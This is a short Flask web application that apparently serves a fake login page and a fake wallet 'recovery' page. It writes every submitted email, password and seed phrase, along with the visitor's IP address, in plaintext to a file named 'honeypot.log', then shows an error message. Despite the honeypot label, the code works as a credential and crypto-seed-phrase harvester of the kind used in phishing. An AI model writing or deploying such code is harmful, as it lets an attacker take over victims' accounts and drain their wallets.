from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route('/')
def index():
    error = request.args.get('error')
    return render_template('index.html', error=error)

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr

    with open("honeypot.log", "a") as f:
        f.write(f"[Login Attempt] IP: {ip} - Email: {email}, Password: {password}\n")

    return render_template('index.html', error="Invalid Login Details")

@app.route('/recover', methods=['GET', 'POST'])
def recover():
    if request.method == 'POST':
        seed = request.form.get('seed')
        ip = request.remote_addr
        with open("honeypot.log", "a") as f:
            f.write(f"[Recovery Page] IP: {ip} - Seed phrase: {seed}\n")
        return render_template('error.html')
    return render_template('recover.html')

if __name__ == "__main__":
    app.run(debug=True)
